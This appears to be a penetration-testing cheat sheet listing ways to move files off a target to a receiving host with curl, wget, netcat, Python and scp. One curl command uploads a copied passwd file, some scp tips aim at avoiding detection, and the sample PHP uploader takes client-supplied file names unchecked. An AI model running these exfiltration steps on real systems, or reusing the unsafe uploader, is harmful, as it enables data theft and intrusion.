---
legal-banner: true
---

### **File Uploading Using Python and Curl**

1.  Install uploadserver:  
    `sudo python3 -m pip install --user uploadserver`
2.  Generate a self-signed certificate:  
    `openssl req -x509 -out server.pem -keyout server.pem -newkey rsa:2048 -nodes -sha256 -subj '/CN=server'`
3.  Create a directory for the HTTPS server:  
    `mkdir https && cd https`
4.  Start the upload server with HTTPS support:  
    `sudo python3 -m uploadserver 443 --server-certificate ~/server.pem`
5.  Upload files using curl:  
    `curl -X POST https://hostname/upload -F 'files=@/path/to/file' --insecure`

### **File Uploader on Apache Web Server**

1.  Create `upload.php` in `/var/www/html/`:
    
    ```php
    <?php
    $uploaddir = '/var/www/uploads/';
    $uploadfile = $uploaddir . $_FILES['file']['name'];
    move_uploaded_file($_FILES['file']['tmp_name'], $uploadfile)
    ?>
    ```
    
2.  Create uploads directory and set ownership to www-data:  
    `mkdir /var/www/uploads && chown www-data:www-data /var/www/uploads`
    
3.  Upload a file using wget to the Python HTTP server:  
    `wget --post-file=/path/to/file http://[IP-ADRESS]/`
    
4.  Upload a file using wget to the Apache server with upload.php:  
    `wget --post-file=/path/to/file http://[IP-ADRESS]/upload.php`
    

### **File Uploader Using SimpleHTTPServerWithUpload**

1.  Start an HTTP server to accept file uploads using the script from [SimpleHTTPServerWithUpload](https://github.com/Tallguy297/SimpleHTTPServerWithUpload/blob/master/SimpleHTTPServerWithUpload.py):  
    `python3 SimpleHTTPServerWithUpload.py 80`
2.  Upload passwd file using curl:  
    `curl -F 'file=@/dev/shm/passwd' http://[IP-ADRESS]/`

### **File Uploading Using Python Requests Module**

1.  Install the uploadserver package:  
    `pip3 install uploadserver`
2.  Start a Python upload server:  
    `python3 -m uploadserver`
3.  Upload a file:  
    `python3 -c 'import requests;requests.post("http://[IP-ADDRESS]:8000/upload",files={"files":open("/path/to/file","rb")})'`

### **File Uploading Using Netcat**

1.  Start a netcat listener to receive file and save it as file.txt:  
    `nc -nvlp 9001 > file.txt`
2.  Send the file.txt to the receiving machine:  
    `nc [IP-ADDRESS] 9001 < file.txt`

### **File Uploading Using SCP**

1.  **TRANSFERRING FILES WITH A SPECIFIC SSH KEY:**  
    To use a specific SSH key for authentication, include the `-i` option. This is useful when dealing with multiple SSH keys or when the default key is not suitable for the connection.  
    `scp -i /path/to/private_key [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`
2.  **USING NON-STANDARD PORTS:**  
    SSH servers often use non-standard ports for security purposes. Specify the port with the `-P` option to ensure successful connections.  
    `scp -P 2222 [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`
3.  **VERBOSE MODE FOR DEBUGGING:**  
    Verbose mode provides detailed information about the SCP transfer process, which is invaluable for debugging connection issues.  
    `scp -v [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`
4.  **LIMITING BANDWIDTH USAGE:**  
    To avoid detection or to manage network resources efficiently, you can limit the bandwidth usage during file transfer using the `-l` option (specified in kilobits per second):  
    `scp -l 1000 [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`
5.  **TRANSFERRING ENTIRE DIRECTORIES:**  
    When you need to transfer entire directories, use the `-r` option to copy recursively. This ensures all files and subdirectories are included.  
    `scp -r [DIRECTORY-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`
6.  **PRESERVING FILE ATTRIBUTES:**  
    To preserve file attributes such as modification times, access times, and modes, use the `-p` option:  
    `scp -p [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`
7.  **QUIET MODE:**  
    To minimize output and avoid drawing attention, use the `-q` option for quiet mode. This suppresses non-error messages.  
    `scp -q [FILE-TO-SEND] [USER]@[RECEIVER-IP]:/path/to/destination`